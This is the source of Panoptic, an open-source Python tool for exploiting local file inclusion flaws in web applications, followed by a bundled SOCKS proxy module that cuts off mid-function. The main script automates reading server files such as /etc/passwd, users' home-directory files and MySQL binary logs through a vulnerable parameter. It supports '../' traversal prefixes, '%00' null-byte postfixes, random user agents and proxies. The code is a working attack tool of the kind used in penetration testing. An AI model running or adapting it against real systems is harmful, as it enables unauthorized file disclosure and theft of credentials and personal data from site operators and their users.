__FILENAME__ = panoptic
#!/usr/bin/env python
from __future__ import print_function

"""
Copyright (c) 2013 Roberto Christopher Salgado Bjerre, Miroslav Stampar.

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"),
to deal in the Software without restriction, including without limitation the
rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
sell copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

"""
Panoptic

Search and retrieve content of common log and config files through LFI vulnerability
"""

import difflib
import ConfigParser
import os
import random
import re
import string
import sys
import threading
import time
import xml.etree.ElementTree as ET

from urllib import urlencode
from urllib2 import build_opener, install_opener, urlopen, ProxyHandler, Request
from urlparse import urlsplit, urlunsplit, parse_qsl
from optparse import OptionParser
from subprocess import Popen, PIPE
from sys import exit

NAME = "Panoptic"
VERSION = "v0.1"
URL = "https://github.com/lightos/Panoptic/"

# Used for retrieving response for a dummy filename
INVALID_FILENAME = "".join(random.sample(string.letters, 10))

# Maximum length of left option column in help listing
MAX_HELP_OPTION_LENGTH = 20

# Location of file containing test cases
CASES_FILE = "cases.xml"

# Location of file containing user agents
USER_AGENTS_FILE = "agents.txt"

# Location of file containing common user files
HOME_FILES_FILE = "home.txt"

# Used for heuristic comparison of responses
HEURISTIC_RATIO = 0.9

# If content size is bigger than normal (and illegal) skip content retrieval (if --write-files not used) and mark it as found
SKIP_RETRIEVE_THRESHOLD = 1000

# ASCII eye taken from http://www.retrojunkie.com/asciiart/health/eyes.htm
BANNER = """
 .-',--.`-.
<_ | () | _>
  `-`=='-'

%s %s (%s)
""" % (NAME, VERSION, URL)

# Character used for progress rotator
ROTATOR_CHARS = "|/-\\"

# Location of Git repository
GIT_REPOSITORY = "git://github.com/lightos/Panoptic.git"

EXAMPLES = """
Examples:
./panoptic.py --url "http://localhost/lfi.php?file=test.txt"
./panoptic.py --url "http://localhost/lfi.php?file=test.txt&id=1" --param file
./panoptic.py --url "http://localhost/lfi.php" --data "file=test.txt&id=1" --param file

./panoptic.py --list software
./panoptic.py --list category
./panoptic.py --list os

./panoptic.py -u "http://localhost/lfi.php?file=test.txt" --os Windows
./panoptic.py -u "http://localhost/lfi.php?file=test.txt" --software WAMP
"""

class PROXY_TYPE:
    HTTP = "HTTP"
    HTTPS = "HTTPS"
    SOCKS4 = "SOCKS4"
    SOCKS5 = "SOCKS5"

class HTTP_HEADER:
    COOKIE = "Cookie"
    USER_AGENT = "User-agent"
    CONTENT_LENGTH = "Content-length"

class AttribDict(dict):
    def __getattr__(self, name):
        return self.get(name)
    def __setattr__(self, name, value):
        return self.__setitem__(name, value)

# Knowledge base used for storing program wide settings
kb = AttribDict()

# Variable used to store command parsed arguments
args = None

def print(*args, **kwargs):
    """
    Thread-safe version of print function
    """

    with kb.print_lock:
        return __builtins__.print(*args, **kwargs)

def get_cases(args):
    """
    Parse XML and return testing cases filtered by provided args
    """

    tree = ET.parse(CASES_FILE)
    root = tree.getroot()

    def _(parent, element):
        element.parent = parent
        for key, value in element.attrib.items():
            setattr(element, key, value)
        for child in element.getchildren():
            _(element, child)

    _(None, root)

    for attr in ("os", "software", "category"):
        if getattr(args, attr):
            for element in root.findall(".//%s" % attr):
                if element.value.lower() != getattr(args, attr).lower():
                    element.parent.remove(element)

    if args.type:
        for _ in (_ for _ in ("conf", "log", "other") if _.lower() != args.type.lower()):
            for element in root.findall(".//%s" % _):
                element.parent.remove(element)

    def _(element, tag):
        while element.parent is not None:
            if element.parent.tag == tag:
                return element.parent
            else:
                element = element.parent

    cases = []
    replacements = {}

    if args.url:
        replacements["HOST"] = urlsplit(args.url).netloc

    for element in root.findall(".//file"):
        case = AttribDict()
        case.location = element.value
        case.os = _(element, "os").value
        case.category = _(element, "category").value
        case.software = _(element, "software").value
        case.type = _(element, "log") is not None and "log"\
                    or _(element, "conf") is not None and "conf"\
                    or _(element, "other") is not None and "other"

        for variable in re.findall(r"\{[^}]+\}", case.location):
            case.location = case.location.replace(variable, replacements.get(variable.strip("{}"), variable))

        match = re.search(r"\[([^\]]+)\]", case.location)
        if match and kb.through:
            original = case.location
            for replacement in kb.versioned_locations[match.group(1)]:
                case = AttribDict(case)
                case.location = original.replace(match.group(0), replacement)
                cases.append(case)
        else:
            cases.append(case)

    return cases

def load_list(filepath):
    """
    Loads list of items from a custom given filepath location
    """

    items = []
    cases = []

    with open(filepath, 'r') as f:
        items = f.readlines()

    for item in items:
        case = AttribDict({'location': item.strip()})
        cases.append(case)

    return cases

def get_revision():
    """
    Returns abbreviated commit hash number as retrieved with "git rev-parse --short HEAD"
    """

    retval = None
    filepath = None
    _ = os.path.dirname(__file__)

    while True:
        filepath = os.path.join(_, ".git", "HEAD")
        if os.path.exists(filepath):
            break
        else:
            filepath = None
            if _ == os.path.dirname(_):
                break
            else:
                _ = os.path.dirname(_)

    while True:
        if filepath and os.path.isfile(filepath):
            with open(filepath, "r") as f:
                content = f.read()
                filepath = None
                if content.startswith("ref: "):
                    filepath = os.path.join(_, ".git", content.replace("ref: ", "")).strip()
                else:
                    match = re.match(r"(?i)[0-9a-f]{32}", content)
                    retval = match.group(0) if match else None
                    break
        else:
            break

    if not retval:
        process = Popen("git rev-parse --verify HEAD", shell=True, stdout=PIPE, stderr=PIPE)
        stdout, _ = process.communicate()
        match = re.search(r"(?i)[0-9a-f]{32}", stdout or "")
        retval = match.group(0) if match else None

    return retval[:7] if retval else None

def check_revision():
    """
    Adapts default version string and banner to use revision number (if available)
    """

    global BANNER
    global VERSION

    revision = get_revision()

    if revision:
        _ = VERSION
        VERSION = "%s-%s" % (VERSION, revision)
        BANNER = BANNER.replace(_, VERSION)

def update():
    """
    Do the program update
    """

    print("[i] Checking for updates...")

    process = Popen("git pull %s HEAD" % GIT_REPOSITORY, shell=True, stdout=PIPE, stderr=PIPE)
    stdout, stderr = process.communicate()
    success = not process.returncode

    if success:
        updated = "Already" not in stdout
        process = Popen("git rev-parse --verify HEAD", shell=True, stdout=PIPE, stderr=PIPE)
        stdout, _ = process.communicate()
        revision = stdout[:7] if stdout and re.search(r"(?i)[0-9a-f]{32}", stdout) else "-"
        print("[i] %s the latest revision '%s'" % ("Already at" if not updated else "Updated to", revision))
    else:
        print("[!] Problem occurred while updating program (%s)" % repr(stderr.strip()))
        print("[i] Please make sure that you have a 'git' package installed")

def ask_question(question, default=None, automatic=False):
    """
    Asks a given question and returns result
    """

    question = "[?] %s " % question

    if automatic:
        answer = default
        print("%s%s" % (question, answer))
    else:
        with kb.print_lock:
            answer = raw_input(question)

    print

    return answer

def prepare_request(payload):
    """
    Prepares HTTP (GET or POST) request with proper payload
    """

    _ = re.sub(r"(?P<param>%s)={1}(?P<value>[^=&]+)" % args.param,
                            r"\1=%s" % payload, kb.request_params)

    request_args = {"url": "%s://%s%s" % (kb.parsed_target_url.scheme or "http", kb.parsed_target_url.netloc, kb.parsed_target_url.path)}

    if args.data:
        request_args["data"] = _
    else:
        request_args["url"] += "?%s" % _

    if args.header:
        request_args["header"] = args.header

    if args.cookie:
        request_args["cookie"] = args.cookie

    if args.user_agent:
        request_args["user_agent"] = args.user_agent

    request_args["verbose"] = args.verbose

    return request_args

def clean_response(response, filepath):
    """
    Cleans response from occurrences of filepath
    """

    response = response.replace(filepath, "")
    regex = re.sub(r"[^A-Za-z0-9]", "(.|&\w+;|%[0-9A-Fa-f]{2})", filepath)

    return re.sub(regex, "", response, re.I)

def request_file(case, replace_slashes=True):
    """
    Requests target for a file described in case
    """

    global ROTATOR_CHARS

    if args.replace_slash and replace_slashes:
        case.location = case.location.replace("/", args.replace_slash.replace("\\", "\\\\"))

    if kb.restrict_os and kb.restrict_os != case.os:
        if args.verbose:
            print("[*] Skipping '%s'" % case.location)

        return None

    if args.prefix and args.prefix[len(args.prefix) - 1] == "/":
        args.prefix = args.prefix[:-1]

    if args.verbose:
        print("[*] Trying '%s'" % case.location)
    else:
        with kb.print_lock:
            sys.stdout.write("\r%s\r" % ROTATOR_CHARS[0])
            sys.stdout.flush()

    ROTATOR_CHARS = ROTATOR_CHARS[1:] + ROTATOR_CHARS[0]

    request_args = prepare_request("%s%s%s" % (args.prefix, case.location, args.postfix))
    html = get_page(**request_args)

    if not html or args.bad_string and html.find(args.bad_string) != -1:
        return None

    matcher = difflib.SequenceMatcher(None, clean_response(html, case.location), clean_response(kb.invalid_response, INVALID_FILENAME))

    if matcher.quick_ratio() < HEURISTIC_RATIO:
        with kb.value_lock:
            if not kb.found:
                print("[i] Possible file(s) found!")

                if case.os:
                    print("[i] OS: %s" % case.os)

                    if kb.restrict_os is None:
                        answer = ask_question("Do you want to restrict further scans to '%s'? [Y/n]" % case.os, default='Y', automatic=args.automatic)
                        kb.restrict_os = answer.upper() != 'N' and case.os

        _ = "/".join(_ for _ in (case.os, case.category, case.type) if _)
        if _:
            _ = "'%s' (%s)" % (case.location, _)
            _ = _.replace("%s/%s/" % (case.os, case.os), "%s/" % case.os)
        else:
            _ = "'%s'" % case.location

        print("[+] Found %s" % _)

        if args.verbose:
            kb.files.append(_)

        # If --write-file is set
        if args.write_files:
            _ = os.path.join("output", kb.parsed_target_url.netloc)

            if not os.path.exists(_):
                os.makedirs(_)

            with open(os.path.join(_, "%s.txt" % case.location.replace(args.replace_slash if args.replace_slash else "/", "_")), "w") as f:
                content = html

                with kb.value_lock:
                    if kb.filter_output is None:
                        answer = ask_question("Do you want to filter retrieved files from original HTML page content? [Y/n]", default='Y', automatic=args.automatic)
                        kb.filter_output = answer.upper() != 'N'

                if kb.get("filter_output"):
                    matcher = difflib.SequenceMatcher(None, html or "", kb.original_response or "")
                    matching_blocks = matcher.get_matching_blocks()

                    if matching_blocks:
                        start = matching_blocks[0]
                        if start[0] == start[1] == 0 and start[2] > 0:
                            content = content[start[2]:]
                        if len(matching_blocks) > 2:
                            end = matching_blocks[-2]
                            if end[2] > 0 and end[0] + end[2] == len(html) and end[1] + end[2] == len(kb.original_response):
                                content = content[:-end[2]]

                f.write(content)

        return html

    return None

def try_cases(cases):
    """
    Runs tests against given cases
    """

    passwd_files = ["/etc/passwd", "/etc/security/passwd"]

    if args.replace_slash:
        for i, v in enumerate(passwd_files):
            passwd_files[i] = v.replace("/", args.replace_slash)

    for case in cases:
        html = request_file(case)

        if html is None:
            continue
        if not kb.found:
            kb.found = True

        # If --skip-file-parsing is not set.

        if case.location in passwd_files and not args.skip_parsing:
            users = re.finditer("(?P<username>[^:\n]+):(?P<password>[^:]*):(?P<uid>\d+):(?P<gid>\d*):(?P<info>[^:]*):(?P<home>[^:]+):[/a-z]*", html)

            if args.verbose:
                print("[*] Extracting home folders from '%s'" % case.location)

            for user in users:
                if args.verbose:
                    print("[*] User: %s, Info: %s" % (user.group("username"), user.group("info")))
                if not kb.home_files:
                    with open(HOME_FILES_FILE, "r") as f:
                        kb.home_files = filter(None, (_.strip() for _ in f.readlines()))
                for _ in kb.home_files:
                    if user.group("home") == "/":
                        continue
                    request_file(AttribDict({"category": "*NIX User File", "type": "conf", "os": case.os, "location": "%s/%s" % (user.group("home"), _), "software": "*NIX"}))

        if "mysql-bin.index" in case.location and not args.skip_parsing:
            binlogs = re.findall("\\.\\\\(?P<binlog>mysql-bin\\.\\d{0,6})", html)
            location = case.location.rfind("/") + 1

            if args.verbose:
                print("[i] Extracting MySQL binary logs from '%s'" % case.location)

            for _ in binlogs:
                request_file(AttribDict({"category": "Databases", "type": "log", "os": case.os, "location": "%s%s" % (case.location[:location], _), "software": "MySQL"}), False)

def parse_args():
    """
    Parses command line arguments
    """

    OptionParser.format_epilog = lambda self, formatter: self.epilog  # Override epilog formatting

    parser = OptionParser(usage="usage: %prog --url TARGET [options]", epilog=EXAMPLES)

    parser.add_option("-v", "--verbose", action="store_true", dest="verbose",
                help="display extra output information")

    # Required
    parser.add_option("-u", "--url", dest="url",
                help="set target URL")
    # Optional
    parser.add_option("-p", "--param", dest="param",
                help="set parameter name to test for (e.g. \"page\")")

    parser.add_option("-d", "--data", dest="data",
                help="set data for HTTP POST request (e.g. \"page=default\")")

    parser.add_option("-t", "--type", dest="type",
                help="set type of file to look for (\"conf\" or \"log\")")

    parser.add_option("-o", "--os", dest="os",
                help="set filter name for OS (e.g. \"*NIX\")")

    parser.add_option("-s", "--software", dest="software",
                help="set filter name for software (e.g. \"PHP\")")

    parser.add_option("-c", "--category", dest="category",
                help="set filter name for category (e.g. \"FTP\")")

    parser.add_option("-l", "--list", dest="list", metavar="GROUP",
                help="list available filters for group (e.g. \"software\")")

    parser.add_option("-a", "--auto", dest="automatic", action="store_true",
                help="avoid user interaction by using default options")

    parser.add_option("-w", "--write-files", dest="write_files", action="store_true",
                help="write content of retrieved files to output folder")

    parser.add_option("-x", "--skip-parsing", dest="skip_parsing", action="store_true",
                help="skip special tests if *NIX passwd file is found")

    parser.add_option("--load", dest="list_file", metavar="LISTFILE",
                help="load and try user provided list from a file")

    parser.add_option("--ignore-proxy", dest="ignore_proxy", action="store_true",
                help="ignore system default HTTP proxy")

    parser.add_option("--proxy", dest="proxy",
                help="set proxy (e.g. \"socks5://192.168.5.92\")")

    parser.add_option("--user-agent", dest="user_agent", metavar="UA",
                help="set HTTP User-Agent header value")

    parser.add_option("--random-agent", dest="random_agent", action="store_true",
                help="choose random HTTP User-Agent header value")

    parser.add_option("--cookie", dest="cookie",
                help="set HTTP Cookie header value (e.g. \"sid=foobar\")")

    parser.add_option("--header", dest="header",
                help="set a custom HTTP header (e.g. \"Max-Forwards=10\")")

    parser.add_option("--prefix", dest="prefix", default="",
                help="set prefix for file path (e.g. \"../\")")

    parser.add_option("--postfix", dest="postfix", default="",
                help="set postfix for file path (e.g. \"%00\")")

    parser.add_option("--multiplier", dest="multiplier", type="int", default=1,
                help="set multiplication number for prefix (default: 1)")

    parser.add_option("--bad-string", dest="bad_string", metavar="STRING",
                help="set a string occurring when file is not found")

    parser.add_option("--replace-slash", dest="replace_slash",
                help="set replacement for char / in paths (e.g. \"/././\")")

    parser.add_option("--threads", dest="threads", type="int", default=1,
                help="set number of threads (default: 1)")

    parser.add_option("--through", dest="through",
                help="include testing of versioned locations")

    parser.add_option("--update", dest="update", action="store_true",
                help="update Panoptic from official repository")

    parser.formatter.store_option_strings(parser)
    parser.formatter.store_option_strings = lambda _: None

    for option, value in parser.formatter.option_strings.items():
        value = re.sub(r"\A(-\w+) (\w+), (--[\w-]+=(\2))\Z", r"\g<1>/\g<3>", value)
        value = value.replace(", ", '/')
        if len(value) > MAX_HELP_OPTION_LENGTH:
            value = ("%%.%ds.." % (MAX_HELP_OPTION_LENGTH - parser.formatter.indent_increment)) % value
        parser.formatter.option_strings[option] = value

    args = parser.parse_args()[0]

    if not any((args.url, args.list, args.update)):
        parser.error("missing argument for target url. Use '-h' for help.")

    if args.prefix:
        args.prefix = args.prefix * args.multiplier

    return args

def main():
    """
    Initializes and executes the program
    """

    global args

    kb.files = []
    kb.found = False
    kb.print_lock = threading.Lock()
    kb.value_lock = threading.Lock()
    kb.versioned_locations = {}

    check_revision()

    print(BANNER)

    args = parse_args()

    if args.update:
        update()
        exit()

    with open("versions.ini") as f:
        section = None
        for line in f.xreadlines():
            line = line.strip()
            if re.match(r"\[.+\]", line):
                section = line.strip("[]")
            elif line:
                if section not in kb.versioned_locations:
                    kb.versioned_locations[section] = []
                kb.versioned_locations[section].append(line)

    cases = get_cases(args) if not args.list_file else load_list(args.list_file)

    if args.list:
        args.list = args.list.lower()

        _ = ("category", "software", "os")
        if args.list not in _:
            print("[!] Valid values for option '--list' are: %s" % ", ".join(_))
            exit()

        print("[i] Listing available filters for usage with option '--%s':\n" % args.list)

        try:
            for _ in set([_[args.list] for _ in cases]):
                print(_ if re.search(r"\A[A-Za-z0-9]+\Z", _) else '"%s"' % _)
        except KeyError:
            pass
        finally:
            exit()

    if args.ignore_proxy:
        _ = ProxyHandler({})
        opener = build_opener(_)
        install_opener(opener)
    elif args.proxy:
        from thirdparty.socks import socks

        match = re.search(r"(?P<type>[^:]+)://(?P<address>[^:]+):(?P<port>\d+)", args.proxy, re.I)
        if match:
            if match.group("type").upper() == PROXY_TYPE.SOCKS4:
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, match.group("address"), int(match.group("port")), True)
            elif match.group("type").upper() == PROXY_TYPE.SOCKS5:
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, match.group("address"), int(match.group("port")), True)
            elif match.group("type").upper() in (PROXY_TYPE.HTTP, PROXY_TYPE.HTTPS):
                _ = ProxyHandler({match.group("type"): args.proxy})
                opener = build_opener(_)
                install_opener(opener)

    if args.random_agent:
        with open(USER_AGENTS_FILE, 'r') as f:
            args.user_agent = random.sample(f.readlines(), 1)[0]

    kb.parsed_target_url = urlsplit(args.url)
    kb.request_params = args.data if args.data else kb.parsed_target_url.query

    if not args.param:
        match = re.match("(?P<param>[^=&]+)={1}(?P<value>[^=&]+)", kb.request_params)
        if match:
            args.param = match.group("param")
        else:
            print("[!] No usable GET/POST parameters found.")
            exit()

    if args.os:
        kb.restrict_os = args.os

    print("[i] Starting scan at: %s\n" % time.strftime("%X"))
    print("[i] Checking original response...")

    request_args = prepare_request(None)
    request_args["url"] = args.url

    if args.data:
        request_args["data"] = args.data

    kb.original_response = get_page(**request_args)

    print("[i] Checking invalid response...")

    request_args = prepare_request("%s%s%s" % (args.prefix, INVALID_FILENAME, args.postfix))
    kb.invalid_response = get_page(**request_args)

    print("[i] Done!")
    print("[i] Searching for files...")

    if args.threads > 1:
        print("[i] Starting %d threads" % args.threads)

    threads = []
    for i in xrange(args.threads):
        thread = threading.Thread(target=try_cases, args=([cases[_] for _ in xrange(i, len(cases), args.threads)],))
        thread.daemon = True
        thread.start()
        threads.append(thread)

    alive = True
    while alive:
        alive = False
        for thread in threads:
            if thread.isAlive():
                alive = True
                time.sleep(0.1)

    if not kb.found:
        print("[i] No files found!")
    elif args.verbose:
        print("\n[i] Files found:")
        for _ in kb.files:
            print("[o] %s" % _)

    print("  \n[i] File search complete.")
    print("\n[i] Finishing scan at: %s\n" % time.strftime("%X"))

def get_page(**kwargs):
    """
    Retrieves page content from a given target URL
    """

    url = kwargs.get("url", None)
    post = kwargs.get("data", None)
    header = kwargs.get("header", None)
    cookie = kwargs.get("cookie", None)
    user_agent = kwargs.get("user_agent", None)
    verbose = kwargs.get("verbose", False)

    headers = {}
    parsed_url = None
    page = None

    if url is None:
        raise Exception("[!] URL cannot be None.")

    try:
        parsed_url = urlsplit(url)
    except:
        raise Exception("[!] Unable to parse URL: %s" % url)

    if user_agent is None:
        user_agent = "%s %s" % (NAME, VERSION)

    if post is None:
        parsed_url = parsed_url._replace(query=urlencode(parse_qsl(parsed_url.query)))
        url = urlunsplit(parsed_url)
    else:
        post = urlencode(parse_qsl(post), "POST")

    # Perform HTTP Request
    try:
        headers[HTTP_HEADER.USER_AGENT] = user_agent

        if cookie:
            headers[HTTP_HEADER.COOKIE] = cookie

        if header:
            headers[header.split("=")[0]] = header.split("=", 1)[1]

        req = Request(url, post, headers)
        conn = urlopen(req)

        if not args.write_files and kb.original_response and kb.invalid_response:
            _ = conn.headers.get(HTTP_HEADER.CONTENT_LENGTH, "")
            if _.isdigit():
                _ = int(_)
                if _ - max(len(kb.original_response), len(kb.invalid_response)) > SKIP_RETRIEVE_THRESHOLD:
                    page = "".join(random.choice(string.letters) for i in xrange(_))

        # Get HTTP Response
        if not page:
            page = conn.read()

    except KeyboardInterrupt:
        raise

    except Exception, e:
        if hasattr(e, "read"):
            page = page or e.read()

        if verbose:
            if hasattr(e, "msg"):
                print("[!] Error msg '%s'" % e.msg)
            if hasattr(e, "reason"):
                print("[!] Error reason '%s'" % e.reason)
            if hasattr(e, "message"):
                print("[!] Error message '%s'" % e.message)
            if hasattr(e, "code"):
                print("[!] HTTP error code '%d'" % e.code)
            if hasattr(e, "info"):
                print("[!] Response headers '%s'" % e.info())

    return page

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("[!] Ctrl-C pressed")

########NEW FILE########
__FILENAME__ = socks
"""SocksiPy - Python SOCKS module.
Version 1.00

Copyright 2006 Dan-Haim. All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:
1. Redistributions of source code must retain the above copyright notice, this
   list of conditions and the following disclaimer.
2. Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution.
3. Neither the name of Dan Haim nor the names of his contributors may be used
   to endorse or promote products derived from this software without specific
   prior written permission.
   
THIS SOFTWARE IS PROVIDED BY DAN HAIM "AS IS" AND ANY EXPRESS OR IMPLIED
WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO
EVENT SHALL DAN HAIM OR HIS CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA
OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT
OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMANGE.


This module provides a standard socket-like interface for Python
for tunneling connections through SOCKS proxies.

"""

import socket
import struct

PROXY_TYPE_SOCKS4 = 1
PROXY_TYPE_SOCKS5 = 2
PROXY_TYPE_HTTP = 3

_defaultproxy = None
_orgsocket = socket.socket

class ProxyError(Exception):
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return repr(self.value)

class GeneralProxyError(ProxyError):
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return repr(self.value)

class Socks5AuthError(ProxyError):
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return repr(self.value)

class Socks5Error(ProxyError):
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return repr(self.value)

class Socks4Error(ProxyError):
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return repr(self.value)

class HTTPError(ProxyError):
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return repr(self.value)

_generalerrors = ("success",
		   "invalid data",
		   "not connected",
		   "not available",
		   "bad proxy type",
		   "bad input")

_socks5errors = ("succeeded",
		  "general SOCKS server failure",
		  "connection not allowed by ruleset",
		  "Network unreachable",
		  "Host unreachable",
		  "Connection refused",
		  "TTL expired",
		  "Command not supported",
		  "Address type not supported",
		  "Unknown error")

_socks5autherrors = ("succeeded",
		      "authentication is required",
		      "all offered authentication methods were rejected",
		      "unknown username or invalid password",
		      "unknown error")

_socks4errors = ("request granted",
		  "request rejected or failed",
		  "request rejected because SOCKS server cannot connect to identd on the client",
		  "request rejected because the client program and identd report different user-ids",
		  "unknown error")

def setdefaultproxy(proxytype=None,addr=None,port=None,rdns=True,username=None,password=None):
	"""setdefaultproxy(proxytype, addr[, port[, rdns[, username[, password]]]])
	Sets a default proxy which all further socksocket objects will use,
	unless explicitly changed.
	"""
	global _defaultproxy
	_defaultproxy = (proxytype,addr,port,rdns,username,password)
	
class socksocket(socket.socket):
	"""socksocket([family[, type[, proto]]]) -> socket object
	
	Open a SOCKS enabled socket. The parameters are the same as
	those of the standard socket init. In order for SOCKS to work,
	you must specify family=AF_INET, type=SOCK_STREAM and proto=0.
	"""
	
	def __init__(self, family=socket.AF_INET, type=socket.SOCK_STREAM, proto=0, _sock=None):
		_orgsocket.__init__(self,family,type,proto,_sock)
		if _defaultproxy != None:
			self.__proxy = _defaultproxy
		else:
			self.__proxy = (None, None, None, None, None, None)
		self.__proxysockname = None
		self.__proxypeername = None
	
	def __recvall(self, bytes):
		"""__recvall(bytes) -> data
		Receive EXACTLY the number of bytes requested from the socket.
		Blocks until the required number of bytes have been received.
		"""
		data = ""
		while len(data) < bytes:
			data = data + self.recv(bytes-len(data))
		return data
	
	def setproxy(self,proxytype=None,addr=None,port=None,rdns=True,username=None,password=None):
		"""setproxy(proxytype, addr[, port[, rdns[, username[, password]]]])
		Sets the proxy to be used.
		proxytype -	The type of the proxy to be used. Three types
				are supported: PROXY_TYPE_SOCKS4 (including socks4a),
				PROXY_TYPE_SOCKS5 and PROXY_TYPE_HTTP
		addr -		The address of the server (IP or DNS).
		port -		The port of the server. Defaults to 1080 for SOCKS
				servers and 8080 for HTTP proxy servers.
		rdns -		Should DNS queries be preformed on the remote side
				(rather than the local side). The default is True.
				Note: This has no effect with SOCKS4 servers.
		username -	Username to authenticate with to the server.
				The default is no authentication.
		password -	Password to authenticate with to the server.
				Only relevant when username is also provided.
		"""
		self.__proxy = (proxytype,addr,port,rdns,username,password)
	
	def __negotiatesocks5(self,destaddr,destport):
		"""__negotiatesocks5(self,destaddr,destport)
		Negotiates a connection through a SOCKS5 server.
		"""
		# First we'll send the authentication packages we support.
		if (self.__proxy[4]!=None) and (self.__proxy[5]!=None):
			# The username/password details were supplied to the
			# setproxy method so we support the USERNAME/PASSWORD
			# authentication (in addition to the standard none).
			self.sendall("\x05\x02\x00\x02")
		else:
			# No username/password were entered, therefore we
			# only support connections with no authentication.
			self.sendall("\x05\x01\x00")
		# We'll receive the server's response to determine which
		# method was selected
		chosenauth = self.__recvall(2)
		if chosenauth[0] != "\x05":
			self.close()
			raise GeneralProxyError((1,_generalerrors[1]))
		# Check the chosen authentication method
		if chosenauth[1] == "\x00":
			# No authentication is required
			pass
		elif chosenauth[1] == "\x02":
			# Okay, we need to perform a basic username/password
			# authentication.
			self.sendall("\x01" + chr(len(self.__proxy[4])) + self.__proxy[4] + chr(len(self.proxy[5])) + self.__proxy[5])
			authstat = self.__recvall(2)
			if authstat[0] != "\x01":
				# Bad response
				self.close()
				raise GeneralProxyError((1,_generalerrors[1]))
			if authstat[1] != "\x00":
				# Authentication failed
				self.close()
				raise Socks5AuthError,((3,_socks5autherrors[3]))
			# Authentication succeeded
		else:
			# Reaching here is always bad
			self.close()
			if chosenauth[1] == "\xFF":
				raise Socks5AuthError((2,_socks5autherrors[2]))
			else:
				raise GeneralProxyError((1,_generalerrors[1]))
		# Now we can request the actual connection
		req = "\x05\x01\x00"
		# If the given destination address is an IP address, we'll
		# use the IPv4 address request even if remote resolving was specified.
		try:
			ipaddr = socket.inet_aton(destaddr)
			req = req + "\x01" + ipaddr
		except socket.error:
			# Well it's not an IP number,  so it's probably a DNS name.
			if self.__proxy[3]==True:
				# Resolve remotely
				ipaddr = None
				req = req + "\x03" + chr(len(destaddr)) + destaddr
			else:
				# Resolve locally
				ipaddr = socket.inet_aton(socket.gethostbyname(destaddr))
				req = req + "\x01" + ipaddr
		req = req + struct.pack(">H",destport)
		self.sendall(req)
		# Get the response
		resp = self.__recvall(4)
		if resp[0] != "\x05":
			self.close()
			raise GeneralProxyError((1,_generalerrors[1]))
		elif resp[1] != "\x00":
			# Connection failed
			self.close()
			if ord(resp[1])<=8:
				raise Socks5Error(ord(resp[1]),_generalerrors[ord(resp[1])])
			else:
				raise Socks5Error(9,_generalerrors[9])
		# Get the bound address/port
		elif resp[3] == "\x01":
			boundaddr = self.__recvall(4)
		elif resp[3] == "\x03":
			resp = resp + self.recv(1)
			boundaddr = self.__recvall(resp[4])
		else:
			self.close()
			raise GeneralProxyError((1,_generalerrors[1]))
		boundport = struct.unpack(">H",self.__recvall(2))[0]
		self.__proxysockname = (boundaddr,boundport)
		if ipaddr != None:
			self.__proxypeername = (socket.inet_ntoa(ipaddr),destport)
		else:
			self.__proxypeername = (destaddr,destport)
	
	def getproxysockname(self):
		"""getsockname() -> address info
		Returns the bound IP address and port number at the proxy.
		"""
		return self.__proxysockname
	
	def getproxypeername(self):
		"""getproxypeername() -> address info
		Returns the IP and port number of the proxy.
		"""
		return _orgsocket.getpeername(self)
	
	def getpeername(self):
		"""getpeername() -> address info
		Returns the IP address and port number of the destination
		machine (note: getproxypeername returns the proxy)
		"""
		return self.__proxypeername
	
	def __negotiatesocks4(self,destaddr,destport):
		"""__negotiatesocks4(self,destaddr,destport)
		Negotiates a connection through a SOCKS4 server.
		"""
		# Check if the destination address provided is an IP address
		rmtrslv = False
		try:
			ipaddr = socket.inet_aton(destaddr)
		except socket.error:
			# It's a DNS name. Check where it should be resolved.
			if self.__proxy[3]==True:
				ipaddr = "\x00\x00\x00\x01"
				rmtrslv = True
			else:
				ipaddr = socket.inet_aton(socket.gethostbyname(destaddr))
		# Construct the request packet
		req = "\x04\x01" + struct.pack(">H",destport) + ipaddr
		# The username parameter is considered userid for SOCKS4
		if self.__proxy[4] != None:
			req = req + self.__proxy[4]
		req = req + "\x00"
		# DNS name if remote resolving is required
		# NOTE: This is actually an extension to the SOCKS4 protocol
		# called SOCKS4A and may not be supported in all cases.
		if rmtrslv==True:
			req = req + destaddr + "\x00"
		self.sendall(req)
		# Get the response from the server
		resp = self.__recvall(8)
		if resp[0] != "\x00":
